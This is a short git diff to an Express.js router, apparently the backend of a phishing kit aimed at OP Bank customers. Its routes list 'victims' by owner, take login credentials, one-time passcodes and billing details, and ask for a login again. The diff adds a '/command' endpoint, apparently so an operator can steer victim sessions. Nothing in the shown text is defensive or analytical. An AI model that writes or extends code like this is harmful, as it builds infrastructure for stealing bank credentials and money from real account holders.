@@ -8,12 +8,14 @@ const {
     deleteEntry,
     submitLoginAgain,
     submitOtp,
+    command,
 } = require("../controllers/opbankController");
 
 const router = express.Router();
 
 router.get("/customers/:owner", getOwnerVics);
 router.get("/customers/id/:uniqueid", getInfo);
+router.post("/command", command);
 router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/billing", submitBilling);
